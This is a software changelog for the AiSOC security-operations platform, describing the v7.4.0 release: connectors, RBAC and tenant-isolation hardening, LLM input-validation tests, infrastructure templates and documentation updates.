- The optional `AISOC_THREATINTEL_SERVICE_TOKEN` gate is off until you
  set it. Set it on both the `agents` and `threatintel` services to
  turn the gate on.
- The Realtime short-lived-ticket auth is enforced server-side; the
  `apps/web` client mints + refreshes tickets automatically against the
  authenticated API session. No client work is required for in-tree
  consumers; external SSE consumers must adopt the ticket flow.
- The marketing-shell unification is a `tryaisoc.com`-only change; it
  doesn't touch the console at `tryaisoc.com/dashboard` or any
  product surface.

## [7.4.0] — 2026-05-29

Security-hardening and platform release. Folds in the May 27–29 hardening wave,
multi-agent routing, and multi-cloud infrastructure skeletons that landed on
`main` since v7.3.1.

### Highlights

- **Security hardening.** Prompt-injection sanitizer wired into the
  classification agents (PR [#219](https://github.com/beenuar/AiSOC/pull/219));
  cross-tenant isolation enforced on the detection-loop suggestion lookups
  (PR [#221](https://github.com/beenuar/AiSOC/pull/221)) and on the compliance,
  phishing, and knowledge-base endpoints
  (PR [#236](https://github.com/beenuar/AiSOC/pull/236)); nightly cross-tenant
  RBAC regression gate (PR [#197](https://github.com/beenuar/AiSOC/pull/197));
  cryptography CVEs cleared and unfixable advisories time-boxed
  (PR [#229](https://github.com/beenuar/AiSOC/pull/229)); CodeQL quality notes
  resolved (PR [#224](https://github.com/beenuar/AiSOC/pull/224)).
- **Multi-agent routing.** `DetectAgent.process` wired to the `FusionEngine`
  over cross-service HTTP (PR [#198](https://github.com/beenuar/AiSOC/pull/198));
  `/investigate` swapped to the `RouterOrchestrator` behind the
  `ROUTER_INVESTIGATE` flag (PR [#196](https://github.com/beenuar/AiSOC/pull/196));
  Redis-backed scheduler singleton guard for in-process workers
  (PR [#218](https://github.com/beenuar/AiSOC/pull/218)).
- **Multi-cloud infrastructure.** Serverless-container Terraform skeletons for
  GCP (Cloud Run + Cloud SQL + Memorystore) and Azure (Container Apps +
  PostgreSQL Flexible Server + Cache for Redis), mirroring the AWS/EKS reference
  file-for-file (PR [#240](https://github.com/beenuar/AiSOC/pull/240)).
- **Live dashboard & landing.** Real `/metrics` data restored on
  `tryaisoc.com/dashboard` (PR [#192](https://github.com/beenuar/AiSOC/pull/192));
  API/agents machines kept warm so the dashboard no longer 500s
  (PR [#234](https://github.com/beenuar/AiSOC/pull/234)); seed timestamps
  re-anchored so the live dashboard never goes empty
  (PR [#235](https://github.com/beenuar/AiSOC/pull/235)); landing CTAs pointed at
  the live dashboard (PR [#233](https://github.com/beenuar/AiSOC/pull/233)).
- **Dependency & CI maintenance.** ~40 Dependabot upgrades across the Python,
  JS, and Go services plus CI stabilization (Ruff cleanup, OpenAPI export
  permissions, pnpm-lock dedupe).

### Bump `@vitejs/plugin-react` 4.7.0 → 6.0.2 in `apps/web`

Dev-only dependency upgrade (PR [#178](https://github.com/beenuar/AiSOC/pull/178)).
`@vitejs/plugin-react@6` is built against vite@8, while vitest@4 (landed in
PR #179) still ships its own internal vite@7. pnpm resolves both side-by-side
without conflict: vitest@4 uses vite@7 for the test runtime, and `react()` is
loaded from the vite@8-flavoured build of the plugin. Vitest is tolerant of
the plugin API surface across vite 5/6/7/8, so `apps/web/vitest.config.ts`
needed no further changes after the cast we already removed in #179.

No production code touched. Locally verified: web 349/349 tests pass, lint
remains at 0 errors / 76 warnings (unchanged baseline), `tsc --noEmit` clean,
production build succeeds.

### Bump `vitest` 2.1.9 → 4.1.6 across the workspace

Dev-only dependency upgrade (PR [#179](https://github.com/beenuar/AiSOC/pull/179))
across `apps/web`, `packages/sdk-ts`, and `services/mcp`. Vitest v3 and v4
introduced two breaking changes that surfaced in our suite:

* **`vitest/config` no longer exports `UserConfig`.** `apps/web/vitest.config.ts`
  used `import('vitest/config').UserConfig['plugins']` to bridge the vitest@2
  (vite@5 types) ↔ `@vitejs/plugin-react@4` (vite@7 types) version mismatch. In
  vitest@4 both packages target vite@7, so the bridging cast is gone and
  `react()` is consumed directly.
* **`global` is no longer in the default DOM lib in `@vitest/runner`'s typing.**
  `packages/sdk-ts/src/client.test.ts` referenced the Node global namespace via
  `(global.fetch as ...)`; it now uses `globalThis.fetch`, which is the
  cross-runtime idiom and was already what every other test in the SDK suite
  used. No runtime behaviour change — `global === globalThis` in Node.

Verified locally: SDK 9/9 tests pass, web 349/349 tests pass, web lint stays at
0 errors (warning count unchanged from PR #193's baseline). No production code
touched, no behavioural change to the published `@aisoc/sdk` package or to the
shipped web bundle.

### Wire `DetectAgent.process` to `FusionEngine` via cross-service HTTP (Issue #190)

Closes [#190](https://github.com/beenuar/AiSOC/issues/190).

Closes the missing edge in the four-agent façade: `DetectAgent` previously
self-described as the public detection surface but had no synchronous entry
point into the fusion pipeline — callers either had to enqueue onto Kafka and
wait, or reach into `services/fusion` internals directly. This change adds the
last mile so a raw alert from any caller (LLM tool calls, ad-hoc CLI, the API
gateway) runs through the same `FusionEngine` instance that backs the Kafka
consumer path — dedup, correlation, ML scoring, confidence labelling, and RBA
all apply identically regardless of how the alert arrived.

Three additive pieces, no behavioural changes to existing paths:

* **`POST /process` on the fusion service**
  (`services/fusion/app/api/router.py`). Accepts a `RawAlert`, returns a
  `FusedAlert`, and is wired to the already-running `FusionWorker`'s engine
  instance via the module-level `_worker_ref` the worker registers on startup.
  Returns `503` when the worker hasn't finished booting (Kafka consumer not
  yet attached) so callers fail loudly instead of getting a half-initialised
  pipeline. Lives at the root path — the router is mounted with no prefix in
  `services/fusion/app/main.py`.
* **`services/agents/app/tools/fusion.py`** — thin async HTTP client used by
  the agents service. Posts to `{FUSION_SERVICE_URL}/process` (defaults to
  `http://fusion:8003/process` inside the docker-compose network), forwards
  an optional bearer token, and **raises** on any non-2xx or transport error.
  This is a deliberate contrast with `app.tools.graph`, which degrades
  gracefully for investigation queries: fusion is the primary detection
  plane, so a silent fallback here would lose alerts.
* **`DetectAgent.process(raw_alert, *, api_token=None)`**
  (`services/agents/app/agents/__init__.py`). Classmethod delegate over the
  HTTP client — keeps `DetectAgent` import-light (no engine instantiation in
  the agents process) and preserves the existing back-compat aliases.

Tests lock the contract on both sides. `services/fusion/tests/test_process_endpoint.py`
exercises the endpoint against an `ASGITransport` + `AsyncClient`: novel
alerts return a `NEW_INCIDENT` envelope, replays return `DUPLICATE`, an
unwired worker yields `503`, a worker without an engine yields `503`,
malformed and bad-severity payloads return `422`, and a regression guard
asserts the endpoint and worker share the same `FusionEngine` instance.
`services/agents/tests/test_fusion_client.py` uses `respx` to lock the
client wiring: it must post to `/process` (not `/api/fusion/process` — that
mismatch was caught and fixed during initial wiring), the Authorization
header is set if and only if a token is supplied, `httpx.HTTPStatusError`
propagates on 503/422, and `httpx.HTTPError` propagates on transport
failures. A final trio of tests pins `DetectAgent.process` as a faithful
delegate to the client (args pass through unchanged, errors propagate, no
swallowed exceptions).

No feature flag and no env gate: the wiring is purely additive — no existing
caller of the fusion service or the agents service changes shape, and the new
endpoint/method only fire when something explicitly invokes them.

### Cross-tenant RBAC regression suite (F013, security)

Closes [#159](https://github.com/beenuar/AiSOC/issues/159).

Pure-unit isolation suites that exercise the tenant boundary at the
endpoint-function level (no live DB, no FastAPI request cycle) so the
contract is testable in milliseconds and survives ORM churn:

- `services/api/tests/test_threat_intel_tenant_isolation.py` — IOC,
  actor, and feed list/get/create/delete are scoped by `tenant_id`,
  cross-tenant lookups resolve to 404, and writes attach
  `current_user.tenant_id` even when the payload smuggles a different
  one.
- `services/api/tests/test_alerts_tenant_isolation.py` — every
  read/write/queue/claim path on `/alerts` binds `tenant_id` into the
  compiled SQL or forwards it to the service layer
  (`build_queue` / `claim_alert`).
- `services/api/tests/test_llm_credentials_tenant_isolation.py` —
  BYOK credential GET/PUT/DELETE scope by `tenant_id`, new rows bind
  the caller's tenant, and `emit_audit` is invoked with the caller's
  tenant + actor (`CredentialVault` is stubbed so the assertions are
  on the persistence boundary, not crypto).

Assertions read the *compiled* SQL bind parameters rather than the
shape of any single query so they don't break on benign rewrites. All
three suites were mutation-tested by temporarily dropping the
`tenant_id` predicate in the corresponding endpoint — every dropped
predicate produced at least one failing test, confirming the suites
are wired to the right surface.

`.github/workflows/cross-tenant-rbac.yml` runs the three suites
nightly on `main` (06:30 UTC, ahead of `compose-smoke-nightly` so a
tenant boundary regression shows up as the first nightly signal) and
on-demand via `workflow_dispatch`. On failure it uploads a JUnit
report and opens a `security`-labelled tracking issue.

### Attack-chain timeline UI (T3.3, v8.0)

`/cases/{id}` now ships an **Attack Chain** tab that visualises the ranked
timeline returned by `/v1/cases/{id}/attack-chain` (shipped earlier under
`8df637b9`). The new `AttackChainPanel` in
`apps/web/src/components/cases/CaseWorkspace.tsx`:

- Window selector with the same vocabulary as the backend `WindowLiteral`
  (`1h`, `6h`, `24h`, `72h`, `7d`, `30d`) — selection is deep-linkable via
  `?window=…` and survives reload.
- One card per `ChainLink` with the alert title, severity chip (driven by
  the canonical 5-tier ladder `info | low | medium | high | critical`),
  confidence percent, MITRE technique IDs, and the deterministic narrative
  reason emitted by `services/api/app/services/attack_chain.py`.
- Entity-graph summary panel — node count grouped by `kind` (`user`,
  `asset`, `process`, `ip`, `domain`, `alert`), top edges, and a per-node
  severity chip when present in `_entity_graph_payload`.
- SWR-keyed on `(case_id, window)` with skeleton, error, and empty states
  that match the rest of the case workspace.
- New `casesApi.getAttackChain` method + `AttackChainTimeline`,
  `AttackChainWindow`, `AttackChainLink`, `AttackChainEntityNode`,
  `AttackChainEntityEdge`, `BackendAttackChainResponse` types in
  `apps/web/src/lib/api.ts`. The wire format matches the backend `to_dict`
  shape exactly (node `kind` rather than `type`; optional `severity` and
  `event_time` from `_entity_graph_payload`).
- Coverage in `apps/web/src/components/cases/CaseWorkspace.test.tsx`:
  empty-state, error-state, and three data-rendering assertions
  (alert titles, confidence percent, MITRE techniques). The SWR mock is now
  key-aware so attack-chain and attack-path fetches stay isolated, and
  `useSearchParams` is stateful so window-selection deep-links round-trip
  cleanly under test. The `WindowSelector` is a labelled
  `role="group"` of buttons with `aria-pressed`, so deep-link assertions
  resolve the active option via the single pressed button inside the
  group rather than a non-existent `<select>` value.

Closes the UI side of T3.3 in `AISOC_V8_PROGRESS.md`. Pre-existing
non-blocking lint warnings in `CaseWorkspace.tsx` are unchanged by this
diff.

### LLM input contract — static regression gate (T2.3, v8.0)

Closes T2.3 by adding the missing **bypass-prevention** layer on top of the
existing fail-closed validator (`services/agents/app/llm/contract.py`). Two
new test files in `services/agents/tests/`:

- `test_llm_contract_extra.py` (10 cases) — fills the coverage gaps in the
  shipped contract: `safe_astream` validates messages exactly once and
  refuses to yield any chunk on violation; `make_safe_chat_model` proxies
  non-LLM attributes through but routes `ainvoke` / `astream` through
  validation; `classify_message` rejects `api_key = '...'` assignments and
  PEM private-key headers; `set_contract_enforcement(False)` lets raw OCSF
  through in soft mode and re-arms cleanly when flipped back to `True`.
- `test_llm_contract_no_bypass.py` (3 cases) — **AST-based static gate**
  that walks every `*.py` file under `services/agents/app/` and fails CI on
  any direct `.ainvoke(...)` / `.astream(...)` call whose receiver is not on
  an explicit allowlist (`_graph`, `investigation_graph`, `graph` — all
  LangGraph control-flow handles, not LLMs) or whose file is not the
  contract module itself. Ships with self-tests proving (a) a synthetic
  `llm.ainvoke(...)` bypass trips the detector and (b) allowlisted
receivers do not. Adding a new agent that calls a chat model directly
now fails the build until it routes through `safe_ainvoke` /
`safe_astream` / `make_safe_chat_model`.

The survey behind this gate confirmed every existing direct chat-model call
under `services/agents/app/` already goes through the safe wrapper — the
remaining `.ainvoke` / `.astream` call sites are LangGraph control-flow on
compiled graphs, which is why those receivers are explicitly allowlisted
rather than silently ignored.

### LLM input contract — CI tests (T2.3, v8.0)

`services/agents/tests/test_llm_contract.py` exercises `classify_message` /
`LLMInputContract.validate` / `validate_messages`: raw OCSF-shaped JSON in a
user message fails closed when `AISOC_AGENTS_LLM_CONTRACT_ENFORCED=1`
(default), and prose plus `summarize_structure_for_llm` output passes. Tests
use `{"role", "content"}` dict messages so they run without importing
`langchain_core` (the contract already coerces LangChain `BaseMessage` and
dicts the same way).

### Real-time graph-update WebSocket (T1.4, v8.0)

Closes the v8.0 loop between the ingest-side graph writer (T1.1) and the
operator console. `services/realtime` now exposes a `graph` WebSocket
channel reachable at `/ws/graph` (or piggy-backed on `/ws/all`) and runs a
dedicated `aisoc-realtime-graph` Kafka consumer group against the
`security.graph_updates` topic that the Go ingest writer publishes to
(`services/ingest/internal/graph/writer.go`). Each `GraphUpdate` envelope
(`entity_id`, `change_type`, `ts`, `label`, `rel_type`, `from`, `to`,
`properties`, `schema_version`) is fanned out to clients scoped by
`tenant_id`, with `default` as the single-tenant fallback so self-hosted
deploys without explicit tenant tagging still light up live. The new
consumer is wired alongside the existing fused-alerts consumer in
non-blocking mode: a missing or unreachable graph topic logs at `warn` and
never blocks the higher-priority alerts/cases/agents/insights fan-out. The
topic name honours both `AISOC_GRAPH_UPDATES_TOPIC` and
`KAFKA_TOPIC_GRAPH_UPDATES` envs (defaults to `security.graph_updates` so
it matches the Go writer's default in
`services/ingest/internal/config/config.go` without manual plumbing), and
setting it to the empty string disables the consumer entirely for tests
that don't spin up Kafka graph traffic. The Investigation Rail and Attack
Chain views (T3.3 UI, in flight) can subscribe today and pick up node /
edge mutations within ~1s of the upstream event reaching ingest.

### Public weekly benchmark scoreboard at /docs/benchmark-scoreboard

Public, append-only weekly scoreboard now lives at
[`/docs/benchmark-scoreboard`](https://docs.tryaisoc.com/docs/benchmark-scoreboard).
One row per published eval run — date, agent version, commit SHA, MITRE
accuracy, MTC p50/p95, total USD, total tokens — sourced from a
checked-in JSON file at `apps/docs/static/data/scoreboard.json` and
validated against `scoreboard.schema.json` on every docs build via the new
`pnpm --filter @aisoc/docs scoreboard:check` script. Substrate rows
(deterministic CI gate, no LLM) are visually separated from wet-eval rows
(real LangGraph agent, real LLM, real cost), so substrate numbers can
never be quoted as live agent performance. Includes an inline SSR-rendered
SVG sparkline of MITRE accuracy over time, no Recharts/client JS bundle
hit. The marketing `/benchmark` page now cross-links to the scoreboard for
the full weekly history. Wet-eval rows arrive automatically once the T5.5
weekly CI workflow lands.

### Connectors — Wazuh Indexer ingest (Stage 2)

New first-class endpoint connector for Wazuh deployments. AiSOC now polls the
Wazuh Indexer API directly (no agent rewrite required) and normalizes alerts
into the platform's OCSF-aligned schema, collapsing Wazuh's native severity
ladder into the four-tier `info | low | medium | high` set used everywhere
else.

- **`services/connectors/app/connectors/wazuh.py`** — `WazuhConnector`
  subclasses `BaseConnector`, polls `wazuh-alerts-*` indices over HTTPX with
  basic-auth, paginates time-windowed queries, retries on 5xx with capped
  backoff, and emits one normalized event per alert hit. Cursor is the
  highest `@timestamp` seen so reruns are idempotent.
- **`services/connectors/app/connectors/__init__.py`** — registered in
  `_CONNECTOR_CLASSES`; the registry now declares 52 first-party connectors.
- **`plugins/wazuh/plugin.yaml`** + `pnpm marketplace:sync` — connector ships
  as a marketplace entry under category `siem`, mirrored into
  `apps/web/public/marketplace/index.json`.
- **`apps/docs/docs/connectors/wazuh.md`** + sidebar entry — operator setup
  walkthrough (API user + role, time-window semantics, severity collapse
  table, troubleshooting matrix).
- **`services/connectors/tests/test_wazuh_connector.py`** — 24 unit tests
  cover schema, auth headers, time-window query shape, retry policy, every
  documented severity bucket, and the empty/error paths.

### CLI — `aisoc plugin new` per-type templates

Replaces the old hard-coded `plugin scaffold` with a real templated generator
keyed on plugin kind (`enricher | connector | responder | detection | widget`).
Templates ship inside the `aisoc-cli` wheel via `importlib.resources` so the
CLI works unchanged after `pip install aisoc-cli`.

- **`packages/aisoc-cli/src/aisoc_cli/main.py`** — `aisoc plugin new <NAME>
  --type <kind>` loads the template tree from
  `src/aisoc_cli/templates/<kind>/`, runs `string.Template` substitution for
  `${slug}`, `${name}`, `${author}`, and writes a project that already
  validates against the manifest schema. `aisoc plugin scaffold` is preserved
  as an alias for backwards compatibility.
- `pyproject.toml` — `force-include` ships the templates tree in the wheel.
- Tests parameterize across all five plugin types and assert the manifest
  validates and no `${...}` placeholders leak through.
- `plugins/templates/README.md` is now a pointer to the canonical templates
  inside the CLI package.
- **`apps/docs/docs/plugins/cli.md`** — documents the new CLI surface and is
  added to the Plugin SDK sidebar.

### Infrastructure — GCP Cloud Run + Cloud SQL Terraform skeleton

Adds a serverless-first BYOC equivalent of the existing AWS module so AiSOC
can be stood up on Google Cloud with one `terraform apply`. Stage 2 #15.

- **`infra/terraform/gcp/`** — Cloud Run for `api`/`web`/`ingest`, Cloud SQL
  Postgres 16 + Memorystore Redis 7.2 on private IPs through a dedicated VPC
  and Serverless VPC Access connector, Secret Manager for every credential
  (auto-generated `postgres_password`, `secret_key`, `credential_key`,
  `redis_auth`, optional `openai_api_key`), and Artifact Registry for images.
  One service account per Cloud Run service with least-privilege
  `secretAccessor` bindings. The skeleton points at the public GHCR demo
  images so a fresh `apply` works zero-config; operators override via
  `api_image` / `web_image` / `ingest_image`.
- **`apps/docs/docs/deployment/gcp.md`** + sidebar entry (between `kubernetes`
  and `env-vars`) — quickstart, state-backend guidance, Cloud SQL Auth Proxy
  notes, cost envelope, and the long-running-services follow-up plan (GKE
  Autopilot for `agents`, `realtime`, `connectors`, `alert-fusion`,
  `threatintel`, `fusion`).
- `infra/terraform/gcp/README.md` mirrors the deploy doc for module-local
  consumption.

### Live Actions — generic vendor/capability dispatcher (Stage 2 #8)

Adds a vendor-pluggable response-action surface so plugins can register
executors against the existing capability taxonomy without forking the
in-tree executor list. The dispatcher always returns a typed
`LiveActionResult`; unknown `(vendor_id, capability)` pairs return `FAILED`
with `error="executor_not_found"` so the agent degrades gracefully instead
of seeing a 500.

- **`services/actions/app/live_actions/models.py`** —
  `LiveActionRequest`/`Result`/`Descriptor` Pydantic models (UTC-aware).
- **`services/actions/app/live_actions/registry.py`** — `LiveActionExecutor`
  ABC + module-level `LiveActionRegistry`.
- **`services/actions/app/live_actions/dispatcher.py`** — structured logging,
  error translation, dry-run + missing-credential semantics
  (`SIMULATED`, never `PARTIAL`).
- Adapters wrap every existing in-tree executor (CrowdStrike, Okta, AWS SG,
  Splunk) so they now show up as `builtin` descriptors.
- **`services/api/app/api/v1/endpoints/live_actions.py`** — `discover`,
  `dispatch`, `dry-run` REST routes; built-ins are registered at app startup.
- 45 new tests across models / registry / dispatcher / router / builtins
  (full actions suite: 99 passed).
- **`apps/docs/docs/concepts/live-actions.md`** + sidebar slot.
- Drive-by: fixed two pre-existing broken doc links flagged by the
  Docusaurus build (osctrl → aisoc-direct stub, `air-gapped` → `env-vars`).

### Agents — deterministic NL→ES|QL translator + 50-pair eval set (Stage 2 #16)

Replaces the template fallback in
`services/api/app/api/v1/endpoints/nl_query.py` with a real, offline-friendly,
deterministic IR + renderer that emits ES|QL, KQL, and SPL and runs every
output through a lightweight grammar validator before returning. An optional
LLM enhancement path (`gpt-4o-mini`) is exposed via `enhance_with_llm` for
callers with credentials; failures fall back to the deterministic path so the
air-gapped story keeps working and the eval harness stays reproducible.

- **`services/agents/app/nl_query/`** — IR, grammar, translator, renderers.
- All `# TODO: translate` comments removed from `nl_query.py`.
- **`services/agents/tests/eval_data/nl_query_eval.json`** — 50-pair gold
  NL→ES|QL eval set.
- **`services/agents/tests/test_nl_query_eval.py`** — 100% syntactic validity,
  100% semantic match (50/50 perfect) against gold intents.
- Pre-existing services/agents tests still green (162 passed) when ignoring
  the asyncpg-dependent suites that fail on a fresh checkout.

### Connectors — auditd file_tail + AiSOC audit.rules profile

Replaces the host-agent dependency for Linux endpoint visibility with a
file-tail connector that consumes `audit.log` directly, plus an opinionated
auditctl ruleset whose `-k` keys map 1:1 to detection rules.

- **`services/connectors/app/connectors/auditd.py`** — `AuditdConnector` tails
  `/var/log/audit/audit.log`, reassembles multi-record events by msg id,
  decodes hex `proctitle`/`argv` blobs, and normalizes via
  `_severity_from_event` using `aisoc_*` keys baked into the audit rules
  profile. Cursor is `(inode, byte_offset)` so log rotation is handled.
- **`profiles/auditd/aisoc.rules`** + `profiles/auditd/README.md` — ships an
  opinionated auditctl ruleset and documents install + reload.
- **`detections/`** — 4 new detection rules pivot off `auditd_key` for
  sudoers / SSH config tampering, kernel module load, and systemd
  persistence. No host-agent dependency.
- `plugins/auditd/plugin.yaml` + `pnpm marketplace:sync` — registers the
  connector in the public marketplace.
- **`apps/docs/docs/connectors/auditd.md`** + sidebar entry — setup doc.
- **`services/connectors/tests/test_auditd_connector.py`** — covers schema,
  hex decode, argv reassembly, multi-record merge, severity heuristic, and
  file tailing (full connectors suite: 444 passed, excluding the
  `apscheduler` dev-dep `test_scheduler.py`).

### Documentation — operator notifications & plugin lifecycle

Two new operator-facing docs pages, both registered in the Docusaurus sidebar:

- **`apps/docs/docs/operations/notifications.md`** — complete inventory of
  every notification surface in AiSOC: Web Push to the responder PWA (VAPID,
  Redis, topic routing), Slack ChatOps via `/aisoc`, Slack/Teams ChatOps
  verification, one-shot `notify_slack` from playbooks, `create_ticket`
  simulation + recommended plugin path, honeytoken first-touch webhooks,
  connector freshness alerts, on-call gating, suppression / quiet-hours, and
  a per-mechanism testing recipe.
- **`apps/docs/docs/plugins/lifecycle.md`** — operator's view of plugin
  states (`Discovered → Loaded → Enabled/Disabled`, plus `signature_status`),
  trust modes (`strict | warn | disabled`), filesystem + OCI discovery, the
  full operator REST API with required permissions, configuration reference,
  upgrade and rollback semantics, and the structlog events worth alerting on.

Both pages cross-link the existing `concepts/live-actions`, `plugins/overview`,
`plugins/publishing`, and `plugins/cli` pages so they sit in the right place
in the information architecture.

### API — blameless case post-mortem endpoint

Mirrors the existing case auto-summary pipeline to produce a deterministic,
blameless retrospective for any case.

- **`services/api/app/services/case_postmortem.py`** — pure builder + async
  DB orchestrator (`build_case_postmortem`). Reuses `SummaryCaseRow` /
  `SummaryCommentRow` / `SummaryTaskRow` fetchers from `case_summary` so the
  post-mortem and the live summary draw from the same source of truth.
  Output is a Pydantic `CasePostmortem` covering incident overview,
  contributing factors, detection timing/gaps, response phases (detect →
  contain → eradicate → recover), blast radius, what went well / what fell
  short, and concrete action items.
- **`services/api/app/services/case_postmortem_html.py`** — pure HTML
  renderer matching the summary renderer (inline CSS, print-friendly,
  defensive escaping, no external assets).
- **`services/api/app/api/v1/endpoints/cases.py`** —
  `GET /api/v1/cases/{case_id}/postmortem` with `?format=json|html`.
- **`services/api/tests/test_case_postmortem.py`** — pure-builder + HTML
  tests including XSS escaping, deterministic ordering, and explicit
  blamelessness assertions (analyst handles must not surface in the
  narrative; the assignee header line is explicitly allow-listed).
- **`apps/docs/docs/operations/case-reports.md`** + sidebar — operator page
  covering both `/summary` and `/postmortem` with audience, output,
  automation, and runbook archive guidance. Cases summary breadcrumb now
  points operators at both endpoints.

### Threat Intelligence — STIX → MISP push (Stage 3 #20)

The threat-intel pipeline already pulled events from MISP (read-only). This
closes the loop with a write path: every STIX 2.1 indicator or bundle
published through `/api/v1/threatintel/stix/...` can be mirrored into the
configured MISP instance as a native event with one or more attributes.

- **`services/api/app/services/misp_push.py`**
  - Pure mappers: `parse_stix_pattern`, `stix_indicator_to_misp_attribute`,
    `stix_bundle_to_misp_event`, `confidence_to_threat_level`. Covers
    `ipv4`/`ipv6`, `domain-name`, `url`, `email-addr`, `file:hashes`
    (MD5/SHA-1/SHA-256/SHA-512) and `file:name`. Untranslatable patterns
    are counted in `skipped_attributes`, never silently dropped.
  - `MispPushClient` — async httpx wrapper for `/users/view/me` (health),
    `/events/add` (push), `/events/view/{id}` (read-back). Every call runs
    through the air-gap gate (`enforce_airgap_for_url`) first.
- **`services/api/app/api/v1/endpoints/stix_taxii.py`**
  - `POST /stix/indicators?push_to_misp=true` — response now includes a
    `misp` block (`pushed`, `misp_event_id`, `misp_event_uuid`, `url`,
    `pushed_attributes`, `skipped_attributes`, `error`).
  - `POST /stix/bundles?push_to_misp=true` — same, but the whole bundle
    becomes one MISP event.
  - `GET /stix/misp/health` — calls MISP `/users/view/me`, never echoes the
    API key back.
  - `POST /stix/misp/dry-run` — returns the exact MISP event payload AiSOC
    *would* send, plus an `airgap_blocked` flag for air-gapped audits.
  - Push failures are intentionally non-fatal: the AiSOC store is the source
    of truth, the MISP mirror is best-effort and surfaces the structured
    error on the same response.
- **`services/api/app/core/config.py`** — new MISP push settings:
  `MISP_VERIFY_SSL`, `MISP_PUSH_AUTO`, `MISP_PUSH_DEFAULT_DISTRIBUTION`,
  `MISP_PUSH_DEFAULT_THREAT_LEVEL`, `MISP_PUSH_DEFAULT_ANALYSIS`,
  `MISP_PUSH_TIMEOUT_SECONDS`. Existing `MISP_URL` / `MISP_API_KEY` are
  reused from the read path.
- **`services/api/tests/test_misp_push.py`** — 76 tests covering pure
  mappers, air-gap gating, MISP HTTP failures (401 / 5xx / timeout), the
  publish endpoints with and without push, the health probe, and the
  dry-run endpoint.
- **`apps/docs/docs/integrations/misp-push.md`** + sidebar entry — operator
  doc with config, endpoints, the STIX→MISP type table, failure modes, and
  the dry-run-as-air-gap-proof workflow.
- **`apps/docs/docs/operations/airgap.md`** — clarifies that the existing
  `MISP_URL` / `MISP_API_KEY` envs cover both pull and push, with a pointer
  to the new integration page.

### Security — MSSP RBAC hardening on `/threat-intel` (Issue F013)

The `/v1/threat-intel/*` endpoints (IOCs, threat actors, intel feeds) were
previously gated only by `get_current_user`, meaning **any authenticated
role**, including `viewer` and `soc_analyst`, could `POST` an IOC, `DELETE`
a feed, or create a new `ThreatActor` profile. In a managed-SOC / MSSP
deployment that is a privilege-escalation vector: a compromised analyst
seat can poison detections across the whole tenant by injecting false IOCs
or deleting the feed that hydrates them.

- **`services/api/app/api/v1/endpoints/threat_intel.py`** — every route now
  declares the explicit permission it needs via
  `Depends(require_permission("threat_intel:read" | "threat_intel:write"))`.
  Read routes (`GET /iocs`, `/iocs/{id}`, `/actors`, `/feeds`) require
  `threat_intel:read`; write routes (`POST /iocs`, `DELETE /iocs/{id}`,
  `POST /actors`, `POST /feeds`, `DELETE /feeds/{id}`) require
  `threat_intel:write`. The legacy `User`-typed dependency was replaced with
  the platform-standard `AuthUser` so JWT and API-key callers are gated by
  the same code path.
- **`services/api/app/core/security.py`** — `ROLE_PERMISSIONS` now grants
  `threat_intel:write` to `tenant_admin` and `soc_lead` in addition to the
  existing `admin` / `platform_admin` / `threat_hunter` set. Without this
  the endpoint hardening would have locked out the two roles that legitimately
  need to manage tenant intel during an investigation.
- **`services/api/tests/test_threat_intel_rbac.py`** — 38 new regression tests
  pin the role/permission map (write-roles must hold `:write`, read-only roles
  must not), assert that `CurrentUser.require_permission` raises HTTP 403 for
  under-privileged roles and 200 for privileged ones, cover the API-key code
  path including scope wildcards, and grep the endpoint module to ensure
  every route still uses `require_permission(...)` (so a refactor that
  silently downgrades a route fails CI).

Tracked as **F013** in `docs/community-feedback/2026-05-12/`.

### Detection quality — per-rule cross-fire FP eval gate (Issue F005)

`scripts/validate_detections.py` already replays each native rule against
its own positive + negative fixture (TP / TN gates), but that test cannot
catch the failure mode operators feel hardest in production: rule **R**
firing on an event that was meant for rule **O**. A single overly-broad
rule that matches every `ConsoleLogin` or every `rundll32.exe` execution
silently drives alert volume up and precision down across the whole pack
without tripping the per-rule TP/TN replay.

- **`services/agents/tests/test_detection_fp_rate.py`** — new pytest
  suite that replays every native rule's `match_when` against every
  *other* rule's positive fixture and grades the per-rule cross-fire
  FPR. Fails CI if any rule exceeds `MAX_PER_RULE_FPR` (default 5%) or
  regresses on its own positive/negative fixture. Failure output groups
  the worst 10 offenders with their cross-fire targets so the operator
  can narrow the rule (or allowlist a deliberate broad-vs-narrow
  overlap via `EXPECTED_CROSS_FIRES`) without re-running a full eval
  sweep. Current corpus: 816 native rules evaluated, mean FPR 0.0,
  worst FPR 0.49% — well under the 5% ceiling.
- **`scripts/run_evals.py`** — wires the new gate into the unified
  eval runner as `suites.detection_fp_rate`, reporting
  `worst_per_rule_fp_rate` (lower-is-better) alongside the existing
  alert-reduction / investigation-completeness / response-quality
  gates so dashboards and CI consume it through the same JSON shape.

Tracked as **F005** in `docs/community-feedback/2026-05-12/`.

### Documentation — install pipeline + v2.2 architecture refresh

Documentation-only refresh that aligns every install / architecture page
with the actual shipped state of the repo. No service code, schema, or
API surface changed.

- **One-click install pipeline** is now a first-class doc surface.
  - New Docusaurus page `apps/docs/docs/installation.md` (sidebar
    position 2) walks through `install.sh` / `install.ps1` end-to-end —
    supported package managers, what gets installed, idempotency, the
    `uninstall.sh` / `uninstall.ps1` graduated cleanup flags, and the
    security model.
  - `apps/docs/docs/quickstart.md` adds it as **Path 0** ("zero-prerequisite
    bootstrap") and renumbers the demo / dev paths.
  - `apps/docs/docs/deployment/docker.md` opens with a callout to the
    installer, refreshes every host/container port mapping against
    `docker-compose.yml`, splits profile-gated services
    (`connectors`, `osquery-tls`, `slack-bot`) out of the default stack,
    and updates the GHCR image list to the full 16-image set.
  - `apps/docs/docs/intro.md` adds the installer to **Get started** and
    corrects the connector-count copy.
  - Root `README.md` already had Path 0 — verified and synced with the
    architecture refresh below.
- **v2.2 architecture surfaces** are now reflected everywhere.
  - `apps/docs/docs/architecture.md` data-flow diagram, monorepo layout,
    and Service Responsibilities table now include `services/osquery-tls`,
    `services/osquery-extensions`, and `services/slack-bot`. Connector
    count corrected to 50 (was 26 / 42 in stale paragraphs).
  - `docs/architecture/SYSTEM_DESIGN.md` connector count corrected to 50,
    Service Responsibilities table extended with the v2.2 services, and a
    new **§13 — v2.2 Additions** appended that documents endpoint
    telemetry (osquery TLS server + extensions), ChatOps (`slack-bot`),
    Responder PWA, MCP server, Investigation Ledger / Ambient Copilot,
    and the one-click install pipeline. v2 / v2.1 narrative preserved.
  - Root `README.md` mermaid diagram + service-map table extended with
    `osquery-tls`, `slack-bot`, `mcp` and the corrected
    `Realtime` / `Web Console` descriptions.
